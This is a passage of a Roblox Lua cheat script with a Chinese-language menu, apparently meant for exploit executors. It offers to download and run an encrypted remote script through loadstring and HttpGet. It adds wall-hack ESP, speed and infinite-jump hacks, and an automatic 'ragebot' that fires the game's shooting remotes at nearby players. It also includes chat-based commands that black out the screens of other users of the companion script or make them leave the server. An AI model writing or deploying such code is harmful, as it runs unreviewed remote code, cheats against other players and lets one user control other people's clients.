            local oldToggle = sec.Toggle
            local oldButton = sec.Button
            if oldToggle then
                sec.Toggle = function(_self, _cfg)
                    local cb = _cfg.Callback
                    _cfg.Callback = function(v) PlayStartSound(); if cb then cb(v) end end
                    return oldToggle(_self, _cfg)
                end
            end
            if oldButton then
                sec.Button = function(_self, _cfg)
                    local cb = _cfg.Callback
                    _cfg.Callback = function() PlayStartSound(); if cb then cb() end end
                    return oldButton(_self, _cfg)
                end
            end
            return sec
        end
    end
    return tabObj
end

Window = library:CreateWindow({
    Name = "款脚本",
    SubName = isFlash and "闪光" or "沉默的刺客",
    Keybind = Enum.KeyCode.RightShift,
    Logo = 83701039519151,
    Scene = 0,
    Theme = "Dark"
})
Window.CurrentConfig = "None"
Window:TabDivider()

do
    local pg = LocalPlayer:WaitForChild("PlayerGui", 10)
    if pg then
        local old = pg:FindFirstChild("KuanUniversalPrompt")
        if old then old:Destroy() end
        local gui = Instance.new("ScreenGui")
        gui.Name = "KuanUniversalPrompt"
        gui.ResetOnSpawn = false
        gui.DisplayOrder = 9999
        gui.IgnoreGuiInset = true
        gui.Parent = pg
        local overlay = Instance.new("Frame", gui)
        overlay.Size = UDim2.new(1, 0, 1, 0)
        overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        overlay.BackgroundTransparency = 1
        overlay.Active = false
        overlay.Selectable = false
        TweenService:Create(overlay, TweenInfo.new(0.25), { BackgroundTransparency = 0.5 }):Play()
        local panel = Instance.new("Frame", gui)
        panel.Size = UDim2.new(0, 320, 0, 170)
        panel.Active = false
        panel.Selectable = false
        panel.Position = UDim2.new(0.5, -160, 0.5, -85)
        panel.BackgroundColor3 = Color3.fromRGB(28, 30, 38)
        Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
        local stroke = Instance.new("UIStroke", panel)
        stroke.Color = Color3.fromRGB(0, 200, 255)
        stroke.Thickness = 1.5
        local title = Instance.new("TextLabel", panel)
        title.Size = UDim2.new(1, 0, 0, 40)
        title.BackgroundTransparency = 1
        title.Text = "款脚本"
        title.TextColor3 = Color3.fromRGB(0, 220, 255)
        title.Font = Enum.Font.GothamBold
        title.TextSize = 16
        local desc = Instance.new("TextLabel", panel)
        desc.Size = UDim2.new(1, -40, 0, 60)
        desc.Position = UDim2.new(0, 20, 0, 50)
        desc.BackgroundTransparency = 1
        desc.Text = "是否额外加载款脚本通用？"
        desc.TextColor3 = Color3.fromRGB(220, 225, 235)
        desc.Font = Enum.Font.GothamMedium
        desc.TextSize = 14
        desc.TextWrapped = true
        local yesBtn = Instance.new("TextButton", panel)
        yesBtn.Size = UDim2.new(0, 130, 0, 36)
        yesBtn.Active = true
        yesBtn.Selectable = true
        yesBtn.ZIndex = 5
        yesBtn.Position = UDim2.new(0, 20, 1, -52)
        yesBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 220)
        yesBtn.Text = "是"
        yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        yesBtn.Font = Enum.Font.GothamBold
        Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 8)
        local noBtn = Instance.new("TextButton", panel)
        noBtn.Size = UDim2.new(0, 130, 0, 36)
        noBtn.Active = true
        noBtn.Selectable = true
        noBtn.ZIndex = 5
        noBtn.Position = UDim2.new(1, -150, 1, -52)
        noBtn.BackgroundColor3 = Color3.fromRGB(60, 64, 74)
        noBtn.Text = "否"
        noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        noBtn.Font = Enum.Font.GothamBold
        Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 8)
        panel.Size = UDim2.new(0, 0, 0, 0)
        panel.Position = UDim2.new(0.5, 0, 0.5, 0)
        TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 320, 0, 170), Position = UDim2.new(0.5, -160, 0.5, -85)
        }):Play()
        local function closeWith(loadUniv)
            TweenService:Create(overlay, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
            TweenService:Create(panel, TweenInfo.new(0.2), { Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0) }):Play()
            task.delay(0.22, function() gui:Destroy() end)
            if loadUniv then
                task.spawn(function()
                    pcall(function()
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%AC%BE%E8%84%9A%E6%9C%AC%E9%80%9A%E7%94%A8%E5%8A%A0%E5%AF%86.lua"))()
                    end)
                end)
            end
        end
        yesBtn.MouseButton1Click:Connect(function() closeWith(true) end)
        noBtn.MouseButton1Click:Connect(function() closeWith(false) end)
    end
end

Window:CreateHomeTab({
    Name = "信息",
    Logo = "83701039519151",
    DiscordInvite = "",
    SupportedExecutors = { "Delta", "Synapse X", "Krnl", "Codex", "Arceus X" },
    UnsupportedExecutors = { "Roblox Studio" },
    Segments = {
        Details = { Text = "取消", Icon = "no" },
        Script = { Text = "更新日志", Icon = "no" },
    },
    Changelog = { { Title = "14.0版本", Description = isFlash and "闪光" or "沉默的刺客" } },
})

local FengYu = Soundify(Window:Tab("内部人员", "83701039519151"))
local Feng = FengYu:Section({ Name = "开发人员", SubName = "款脚本团队", Logo = "83701039519151", Collapsible = true, Collapsed = true })
Feng:Video({ Video = "rbxassetid://5608337069", Name = "视频哦", AutoPlay = true, Looped = true, Volume = 0.5, AspectRatio = "16:9", Radius = 8 })
Feng:Social({ Name = "款脚本创始人", SubName = "若白", SmlName = "QQ", copy = "2838596061", Cbn = "复制", Logo = "rbxassetid://133726756673211" })
Feng:Social({ Name = "测试人员", SubName = " Pizza", SmlName = " QQ", copy = "3911763723", Cbn = "复制", Logo = "rbxassetid://74321980638899" })
Feng:Social({ Name = "测试人员", SubName = "菜鸟", SmlName = "快手号", copy = "4358864292", Cbn = "复制", Logo = "rbxassetid://101841794686409" })
Feng:Social({ Name = "测试人员", SubName = "noob", SmlName = " QQ", copy = "1289069071", Cbn = "复制", Logo = "rbxassetid://97440914928707" })
Feng:Social({ Name = "测试人员", SubName = "耄耋", SmlName = " 快手号", copy = "1420771195", Cbn = "复制", Logo = "rbxassetid://80607128221856" })
Feng:Social({ Name = "测试官", SubName = "noob45", SmlName = " QQ", copy = "3295626426", Cbn = "复制", Logo = "rbxassetid://118907524255142" })
Feng:Social({ Name = "测试官", SubName = "纾苇", SmlName = " QQ", copy = "3528796314", Cbn = "复制", Logo = "rbxassetid://77935840039458" })
Feng:Social({ Name = "款脚本群", SubName = "款脚本", SmlName = "QQ群", copy = "1056676792", Cbn = "复制", Logo = "rbxassetid://83701039519151" })
Feng:Social({ Name = "殺脚本作者(思师)", SubName = "风御 X", SmlName = "QQ", copy = "1926190957", Cbn = "复制", Logo = "rbxassetid://70554553650974" })
Feng:Social({ Name = "殺脚本群", SubName = "殺脚本", SmlName = "QQ群", copy = "958022428", Cbn = "复制", Logo = "rbxassetid://84830962019412" })

Window:TabDivider()

 local tabPerm = Soundify(Window:Tab(selfRole .. "权限", "83701039519151"))
local sectionTag = tabPerm:Section({ Name = selfRole .. "头衔", SubName = "头衔开关与效果", Logo = "83701039519151", Collapsible = true, Collapsed = true })
sectionTag:Toggle({ Name = "显示头顶头衔", Value = true, Callback = function(v)
    showHeadTagEnabled = v
    if v then
        refreshAllTags()
    else
        for p in pairs(activeTags) do clearTag(p) end
    end
end })
if getRank(LocalPlayer.Name) >= 2 then
    sectionTag:Toggle({ Name = "头衔背景图片", Value = false, Callback = function(v)
        tagBackgroundEnabled = v
        for _, billboard in pairs(activeTags) do
            local image = billboard:FindFirstChild("TagBackgroundImage", true)
            if image then image.Visible = v end
        end
    end })
end
if getRank(LocalPlayer.Name) == 3 then
    sectionTag:Toggle({ Name = "流光效果", Value = true, Callback = function(v)
        tagShimmerEnabled = v
    end })
end
sectionTag:Toggle({ Name = "上下震动", Value = false, Callback = function(v)
    tagVerticalShakeEnabled = v
end })
sectionTag:Toggle({ Name = "左右震动", Value = false, Callback = function(v)
    tagHorizontalShakeEnabled = v
end })

-- 区域管理仅向测试人员、测试官和作者开放
if getRank(LocalPlayer.Name) >= 1 then
    local sectionRegion = tabPerm:Section({
        Name = "区域管理",
        SubName = "位置查看与低等级玩家管理",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })

    sectionRegion:Button({
        Name = "定位自己的位置",
        Callback = function()
            local character = LocalPlayer.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if not root then
                pcall(function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "区域管理", Text = "暂时无法获取位置，请确认角色已加载。", Duration = 4
                    })
                end)
                return
            end
            local pos = root.Position
            local positionText = string.format("X: %.2f  Y: %.2f  Z: %.2f", pos.X, pos.Y, pos.Z)
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "你当前的位置", Text = positionText, Duration = 8
                })
            end)
            print("[款脚本] 你当前的位置: " .. positionText)
        end
    })

    -- 测试人员专属：仅影响本地看到的头衔特效，不会远程修改其他玩家客户端。
    sectionRegion:Toggle({
        Name = "本地限制低等级头衔特效",
        Value = false,
        Callback = function(v)
            restrictLowRankTagEffects = v
            refreshAllTags()
        end
    })
end

-- 测试官和作者的聊天“开/关”权限独立于测试人员区域管理。
-- “开”会显示本地客户端可识别的其他脚本用户头衔；“关”则隐藏。
if getRank(LocalPlayer.Name) >= 2 then
    local sectionOfficer = tabPerm:Section({
        Name = "测试官与作者权限",
        SubName = "头衔显示管理",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionOfficer:Button({
        Name = "刷新玩家头衔显示",
        Callback = function()
            showOtherTagsEnabled = true
            allowLowRankTagsEnabled = true
            refreshAllTags()
        end
    })
    sectionOfficer:Button({
        Name = "关闭其他玩家头衔显示",
        Callback = function()
            showOtherTagsEnabled = false
            allowLowRankTagsEnabled = false
            refreshAllTags()
        end
    })

    -- 请求目标离开：目标也必须运行配套款脚本，接收端才会自动同意并退出。
    local leaveRequestTarget = ""
    local sectionLeaveRequest = tabPerm:Section({
        Name = "请求玩家离开",
        SubName = "对方运行配套脚本时自动同意",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionLeaveRequest:Textbox({
        Name = "输入目标 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) leaveRequestTarget = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    sectionLeaveRequest:Button({
        Name = "发送离开请求",
        Callback = function()
            if leaveRequestTarget == "" then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "请先输入用户名。", Duration = 4}) end)
                return
            end
            local target = Players:FindFirstChild(leaveRequestTarget)
            if not target then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "当前服务器找不到该玩家。", Duration = 4}) end)
                return
            end
            if target == LocalPlayer or getRank(target.Name) >= getRank(LocalPlayer.Name) then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "只能请求等级低于自己的玩家。", Duration = 4}) end)
                return
            end
            local channels = TextChatService:FindFirstChild("TextChannels")
            local channel = channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel"))
            if not channel then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "聊天频道不可用，无法发送请求。", Duration = 4}) end)
                return
            end
            local payload = LEAVE_REQUEST_PREFIX .. tostring(target.UserId) .. ":" .. tostring(LocalPlayer.UserId)
            local ok = pcall(function() channel:SendAsync(payload) end)
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = ok and ("已向 " .. target.Name .. " 发送请求；对方需运行配套脚本。") or "发送失败，请检查聊天权限。", Duration = 5}) end)
        end
    })

    -- 黑屏与恢复：通过聊天向目标发送指令，目标需运行配套脚本。
    local blackoutTargetName = ""
    local sectionBlackout = tabPerm:Section({
        Name = "玩家屏幕管理",
        SubName = "向低等级配套脚本用户发送黑屏/恢复指令",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionBlackout:Textbox({
        Name = "输入目标 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) blackoutTargetName = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    local function sendScreenCommand(prefix, title, actionText)
        if blackoutTargetName == "" then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "请先输入用户名。", Duration = 4}) end)
            return
        end
        local target = Players:FindFirstChild(blackoutTargetName)
        if not target then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "当前服务器找不到该玩家。", Duration = 4}) end)
            return
        end
        if target == LocalPlayer or getRank(target.Name) >= getRank(LocalPlayer.Name) then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "只能操作等级低于自己的玩家。", Duration = 4}) end)
            return
        end
        local channels = TextChatService:FindFirstChild("TextChannels")
        local channel = channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel"))
        if not channel then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "聊天频道不可用，无法发送指令。", Duration = 4}) end)
            return
        end
        local payload = prefix .. tostring(target.UserId) .. ":" .. tostring(LocalPlayer.UserId)
        local ok = pcall(function() channel:SendAsync(payload) end)
        pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = ok and (actionText .. target.Name .. "；对方需运行配套脚本。") or "发送失败，请检查聊天权限。", Duration = 5}) end)
    end
    sectionBlackout:Button({Name = "请求对方黑屏", Callback = function() sendScreenCommand(BLACKOUT_REQUEST_PREFIX, "请求黑屏", "已向 ") end})
    sectionBlackout:Button({Name = "请求对方恢复屏幕", Callback = function() sendScreenCommand(RESTORE_REQUEST_PREFIX, "恢复屏幕", "已向 ") end})

    -- 黑名单管理：本地保存并在本机启动脚本时检查；不具备跨客户端同步能力。
    local blacklistInputName = ""
    local sectionBlacklist = tabPerm:Section({
        Name = "款脚本黑名单",
        SubName = "添加或移除本地黑名单记录",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionBlacklist:Textbox({
        Name = "输入玩家 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) blacklistInputName = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    local function notifyBlacklist(message)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "款脚本黑名单", Text = message, Duration = 4
            })
        end)
        print("[款脚本黑名单] " .. message)
    end
    sectionBlacklist:Button({
        Name = "添加到黑名单",
        Callback = function()
            if blacklistInputName == "" then notifyBlacklist("请先输入用户名。"); return end
            if isScriptBlacklisted(blacklistInputName) then notifyBlacklist(blacklistInputName .. " 已在本地黑名单中。"); return end
            table.insert(SCRIPT_BLACKLIST, blacklistInputName)
            local saved = saveScriptBlacklist()
            notifyBlacklist("已记录 " .. blacklistInputName .. (saved and "（已尝试保存到本机）" or "（当前执行器不支持文件保存，仅本次运行有效）"))
        end
    })
    sectionBlacklist:Button({
        Name = "从黑名单移除",
        Callback = function()
            if blacklistInputName == "" then notifyBlacklist("请先输入用户名。"); return end
            local wanted = string.lower(blacklistInputName)
            local removed = false
            for i = #SCRIPT_BLACKLIST, 1, -1 do
                if string.lower(SCRIPT_BLACKLIST[i]) == wanted then
                    table.remove(SCRIPT_BLACKLIST, i)
                    removed = true
                end
            end
            if removed then
                saveScriptBlacklist()
                notifyBlacklist("已从本地黑名单移除 " .. blacklistInputName .. "。")
            else
                notifyBlacklist("名单中没有这个用户名。")
            end
        end
    })
    sectionBlacklist:Button({
        Name = "查看本地黑名单",
        Callback = function()
            if #SCRIPT_BLACKLIST == 0 then notifyBlacklist("当前本地黑名单为空。")
            else notifyBlacklist("本地名单：" .. table.concat(SCRIPT_BLACKLIST, ", ")) end
        end
    })
end
local tabCommon = Soundify(Window:Tab("通用", "83701039519151"))

local sectionESP = tabCommon:Section({ Name = "透视", SubName = "玩家透视", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local espHighlightEnabled, showNames, showHealth = false, false, false
local espCache = {}
local playerAddedConn = nil
local playerRemovingConn = nil
local function getPlayerDisplayName(player)
    if player.DisplayName and player.DisplayName ~= "" then return player.DisplayName end
    return player.Name
end
local function createESPForPlayer(player)
    if espCache[player] then return end
    local data = {connections = {}}
    espCache[player] = data
    local function onCharacterAdded(character)
        if data.highlight then pcall(function() data.highlight:Destroy() end); data.highlight = nil end
        if data.billboard then pcall(function() data.billboard.Parent = nil end); pcall(function() data.billboard:Destroy() end); data.billboard = nil end
        for _, conn in ipairs(data.connections) do if conn then pcall(function() conn:Disconnect() end) end end
        data.connections = {}
        local humanoid = character:WaitForChild("Humanoid", 5)
        if not humanoid then return end
        local head = character:WaitForChild("Head", 5)
        if not head then return end
        if espHighlightEnabled then
            local highlight = Instance.new("Highlight")
            highlight.Name = "ESP_Highlight"
            highlight.Adornee = character
            highlight.FillTransparency = 1
            highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
            highlight.OutlineTransparency = 0
            highlight.Parent = character
            data.highlight = highlight
        end
        local billboard = Instance.new("BillboardGui")
        billboard.Name = "ESP_Billboard"
        billboard.Adornee = head
        billboard.Size = UDim2.new(0, 120, 0, 30)
        billboard.StudsOffset = Vector3.new(0, 1.5, 0)
        billboard.AlwaysOnTop = true
        billboard.Enabled = false
        billboard.Parent = head
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,0,1,0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(255,255,255)
        label.TextStrokeTransparency = 0
        label.Font = Enum.Font.SourceSansBold
        label.TextSize = 10
        label.Visible = false
        label.Parent = billboard
        data.billboard = billboard
        data.label = label
        local function update()
            if humanoid and humanoid.Parent and head and head.Parent and label and label.Parent then
                local textParts = {}
                if showNames then table.insert(textParts, getPlayerDisplayName(player)) end
                if showHealth then table.insert(textParts, string.format("%d/%d", math.floor(humanoid.Health), math.floor(humanoid.MaxHealth))) end
                if #textParts > 0 then
                    label.Text = table.concat(textParts, "\n")
                    label.Visible = true
                    billboard.Enabled = true
                else
                    label.Visible = false
                    billboard.Enabled = false
                end
            end
        end
        update()
        table.insert(data.connections, humanoid.HealthChanged:Connect(update))
    end
    if player.Character then onCharacterAdded(player.Character) end
    data.charConnection = player.CharacterAdded:Connect(onCharacterAdded)
end
local function removeESPFromPlayer(player)
    local data = espCache[player]
    if not data then return end
    if data.charConnection then pcall(function() data.charConnection:Disconnect() end) end
    for _, conn in ipairs(data.connections) do if conn then pcall(function() conn:Disconnect() end) end end
    if data.highlight then pcall(function() data.highlight:Destroy() end) end
    if data.billboard then pcall(function() data.billboard.Parent = nil end); pcall(function() data.billboard:Destroy() end) end
    espCache[player] = nil
end
local function rebuildAllESP()
    if not espHighlightEnabled and not showNames and not showHealth then
        for player, _ in pairs(espCache) do removeESPFromPlayer(player) end
        if playerAddedConn then playerAddedConn:Disconnect(); playerAddedConn = nil end
        if playerRemovingConn then playerRemovingConn:Disconnect(); playerRemovingConn = nil end
        return
    end
    for player, data in pairs(espCache) do
        if data.label and data.billboard then
            local char = player.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                local head = char:FindFirstChild("Head")
                if hum and head then
                    local textParts = {}
                    if showNames then table.insert(textParts, getPlayerDisplayName(player)) end
                    if showHealth then table.insert(textParts, string.format("%d/%d", math.floor(hum.Health), math.floor(hum.MaxHealth))) end
                    if #textParts > 0 then
                        data.label.Text = table.concat(textParts, "\n")
                        data.label.Visible = true
                        data.billboard.Enabled = true
                    else
                        data.label.Visible = false
                        data.billboard.Enabled = false
                    end
                end
            end
        end
        if espHighlightEnabled then
            if not data.highlight and player.Character then
                local highlight = Instance.new("Highlight")
                highlight.Name = "ESP_Highlight"
                highlight.Adornee = player.Character
                highlight.FillTransparency = 1
                highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                highlight.OutlineTransparency = 0
                highlight.Parent = player.Character
                data.highlight = highlight
            end
        else
            if data.highlight then pcall(function() data.highlight:Destroy() end); data.highlight = nil end
        end
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not espCache[player] then createESPForPlayer(player) end
    end
    if not playerAddedConn then
        playerAddedConn = Players.PlayerAdded:Connect(function(player)
            if player ~= LocalPlayer then createESPForPlayer(player) end
        end)
    end
    if not playerRemovingConn then
        playerRemovingConn = Players.PlayerRemoving:Connect(removeESPFromPlayer)
    end
end
sectionESP:Toggle({ Name = "绿色边框", Value = false, Callback = function(v) espHighlightEnabled = v; rebuildAllESP() end })
sectionESP:Toggle({ Name = "用户名", Value = false, Callback = function(v) showNames = v; rebuildAllESP() end })
sectionESP:Toggle({ Name = "血量", Value = false, Callback = function(v) showHealth = v; rebuildAllESP() end })

if isFlash then
    local FL = {
        infiniteJump = false, speedEnabled = false, speedValue = 1,
        backstabCheck = false, backstabCooldown = 0,
        deathCheck = false, ragebot = false, ragebotConn = nil,
        currentTarget = nil, lastShotTime = 0, autoLobby = false,
        autoLobbyThread = nil, originalFire = nil, jumpConn = nil, speedConn = nil,
        originalGravity = Workspace.Gravity,
    }

    local function flSetupInfiniteJump()
        if FL.jumpConn then FL.jumpConn:Disconnect() FL.jumpConn = nil end
        if FL.infiniteJump then
            FL.jumpConn = UserInputService.JumpRequest:Connect(function()
                pcall(function()
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild("Humanoid") then char.Humanoid:ChangeState("Jumping") end
                end)
            end)
        end
    end

    local function flSetupSpeed()
        if FL.speedConn then FL.speedConn:Disconnect() FL.speedConn = nil end
        if FL.speedEnabled then
            FL.speedConn = RunService.Heartbeat:Connect(function()
                pcall(function()
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild("Humanoid") then
                        local hum = char.Humanoid
                        if hum.MoveDirection.Magnitude > 0 then
                            char:TranslateBy(hum.MoveDirection * FL.speedValue / 2)
                        end
                    end
                end)
            end)
        end
    end

    local function flCheckBackstab()
        if not FL.backstabCheck or FL.backstabCooldown > 0 then return end
        pcall(function()
            local myChar = LocalPlayer.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHRP then return end
            local myPos, myCF = myHRP.Position, myHRP.CFrame
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character then
                    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    local hum = plr.Character:FindFirstChild("Humanoid")
                    if hrp and hum and hum.Health > 0 then
                        if (myPos-hrp.Position).Magnitude < 30 then
                            if (hrp.Position-myPos).Unit:Dot(myCF.LookVector) < 0.5 then
                                game:GetService("StarterGui"):SetCore("SendNotification", { Title = "有人偷袭", Text = "小心：" .. plr.Name, Duration = 5 })
                                FL.backstabCooldown = 3
                                break
                            end
                        end
                    end
                end
            end
        end)
    end

    RunService.Heartbeat:Connect(function(dt)
        if FL.backstabCooldown > 0 then FL.backstabCooldown = FL.backstabCooldown - dt end
        flCheckBackstab()
    end)

    local function flSetupDeath()
        LocalPlayer.CharacterAdded:Connect(function(character)
            task.wait(0.5)
            pcall(function()
                character:WaitForChild("Humanoid").Died:Connect(function()
                    if FL.deathCheck then
                        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "死亡提醒", Text = "受着", Duration = 8 })
                    end
                end)
            end)
        end)
        if LocalPlayer.Character then
            pcall(function()
                local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                if hum then hum.Died:Connect(function()
                    if FL.deathCheck then
                        game:GetService("StarterGui"):SetCore("SendNotification", { Title = "死亡提醒", Text = "受着", Duration = 8 })
                    end
                end) end
            end)
        end
    end

    local flCamera = Workspace.CurrentCamera

    local function flGetVisiblePart(targetChar)
        if not targetChar or not LocalPlayer.Character then return nil end
        local myChar = LocalPlayer.Character
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return nil end
        local partNames = {"Head","UpperTorso","Torso","LowerTorso","HumanoidRootPart"}
        local bestPart, bestPos, bestOrigin, minD = nil, nil, nil, math.huge
        for _, name in ipairs(partNames) do
            local part = targetChar:FindFirstChild(name)
            if part and part:IsA("BasePart") then
                local tp = part.Position
                for h = 0, 10.5, 2 do
                    local sp = myHRP.Position + Vector3.new(0, h, 0)
                    local dir = (tp - sp).Unit
                    local fp = sp + dir * 2.5
                    local rp = RaycastParams.new()
                    rp.FilterType = Enum.RaycastFilterType.Exclude
                    rp.FilterDescendantsInstances = {myChar, flCamera}
                    rp.IgnoreWater = true
                    local ray = Workspace:Raycast(fp, tp - fp, rp)
                    if not ray or ray.Instance:IsDescendantOf(targetChar) or ray.Instance.Transparency >= 0.9 then
                        local d = (tp-fp).Magnitude
                        if d < minD then minD = d; bestPart = part; bestPos = tp; bestOrigin = fp end
                    end
                end
            end
        end
        return bestPart, bestPos, bestOrigin
    end

    local function flIsDead(plr)
        if not plr or not plr.Character then return true end
        local hum = plr.Character:FindFirstChild("Humanoid")
        return not hum or hum.Health <= 0
    end

    local function flPlayShootSound()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://6534948092"
        s.Volume = 1
        s.Parent = flCamera
        s.PlayOnRemove = true
        s:Destroy()
    end

    local function flCreateBeam(a, b)
        local p1 = Instance.new("Part")
        p1.Anchored = true; p1.CanCollide = false; p1.Transparency = 1
        p1.Size = Vector3.new(0.1,0.1,0.1); p1.Position = a; p1.Parent = Workspace
        local p2 = Instance.new("Part")
        p2.Anchored = true; p2.CanCollide = false; p2.Transparency = 1
        p2.Size = Vector3.new(0.1,0.1,0.1); p2.Position = b; p2.Parent = Workspace
        local at1 = Instance.new("Attachment", p1)
        local at2 = Instance.new("Attachment", p2)
        local b1 = Instance.new("Beam")
        b1.Color = ColorSequence.new(Color3.new(0,0,0))
        b1.Transparency = NumberSequence.new(0)
        b1.Width0 = 0.25; b1.Width1 = 0.25
        b1.Texture = "rbxassetid://7136858729"
        b1.TextureSpeed = 0.8; b1.TextureMode = Enum.TextureMode.Wrap
        b1.Brightness = 1; b1.LightEmission = 0; b1.FaceCamera = true
        b1.Attachment0 = at1; b1.Attachment1 = at2; b1.Parent = p1
        local b2 = Instance.new("Beam")
        b2.Color = ColorSequence.new(Color3.fromRGB(180,200,255))
        b2.Transparency = NumberSequence.new(0.4)
        b2.Width0 = 0.12; b2.Width1 = 0.12
        b2.Texture = "rbxassetid://7136858729"
        b2.TextureSpeed = 1.2; b2.TextureMode = Enum.TextureMode.Wrap
        b2.Brightness = 1.2; b2.LightEmission = 0.6; b2.FaceCamera = true
        b2.Attachment0 = at1; b2.Attachment1 = at2; b2.Parent = p1
        task.delay(math.random(10,40)/10, function()
            pcall(function() p1:Destroy() end)
            pcall(function() p2:Destroy() end)
        end)
    end

    local function flShoot(plr, part, pos, origin)
        local now = tick()
        if now - FL.lastShotTime < 0.56 then return false end
        local char = LocalPlayer.Character
        if not char or not part or not origin then return false end
        local dir = (pos - origin).Unit
        local time = tick()
        local cf = CFrame.lookAt(origin, pos)
        local cr = LocalPlayer:FindFirstChild("ClientRemotes")
        if cr then
            pcall(function() cr.CheckFire:FireServer(time, origin) end)
            pcall(function() cr.CheckShot:FireServer(0, 0, 1, 0.8, cf, pos, part, 11, time) end)
            pcall(function() cr.Reload:FireServer() end)
        end
        local gun = ReplicatedStorage:FindFirstChild("ModuleScripts")
        if gun then
            gun = gun:FindFirstChild("GunModules")
            if gun then
                gun = gun:FindFirstChild("Remote")
                if gun then
                    pcall(function() gun.ProjectileRender:FireServer(time, char, origin, dir*999999, 360, 0, Vector3.zero, 5, "Bullet") end)
                    pcall(function() gun.ProjectileFinished:FireServer(time, CFrame.new(pos), "Gib_T", false, 15, "rbxassetid://2814354338") end)
                end
            end
        end
        flCreateBeam(origin, pos)
        flPlayShootSound()
        FL.lastShotTime = now
        return true
    end

    local function flGetVisibleTargets()
        local list = {}
        local char = LocalPlayer.Character
        if not char then return list end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return list end
        local origin = hrp.Position
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and not flIsDead(plr) and plr.Character then
                local vp, vpos, vo = flGetVisiblePart(plr.Character)
                if vp and vpos and vo then
                    table.insert(list, {player=plr, distance=(vpos-origin).Magnitude, part=vp, position=vpos, origin=vo})
                end
            end
        end
        table.sort(list, function(a,b) return a.distance < b.distance end)
        return list
    end

    local function flToggleRagebot(state)
        if state then
            if not FL.ragebotConn then
                FL.ragebotConn = RunService.Heartbeat:Connect(function()
                    pcall(function()
                        if FL.currentTarget and not flIsDead(FL.currentTarget) then
                            local tc = FL.currentTarget.Character
                            if tc then
                                local vp, vpos, vo = flGetVisiblePart(tc)
                                if vp and vpos and vo then flShoot(FL.currentTarget, vp, vpos, vo) else FL.currentTarget = nil end
                            end
                        else
                            FL.currentTarget = nil
                        end
                        if not FL.currentTarget then
                            local tgs = flGetVisibleTargets()
                            if #tgs > 0 then FL.currentTarget = tgs[1].player end
                        end
                    end)
                end)
            end
        else
            if FL.ragebotConn then FL.ragebotConn:Disconnect() FL.ragebotConn = nil end
            FL.currentTarget = nil
            FL.lastShotTime = 0
        end
    end

    local tabFlash = Soundify(Window:Tab("闪光", "83701039519151"))

    local secMove = tabFlash:Section({ Name = "移动功能", SubName = "", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    secMove:Toggle({ Name = "无限跳跃", Value = false, Callback = function(v) FL.infiniteJump = v; flSetupInfiniteJump() end })
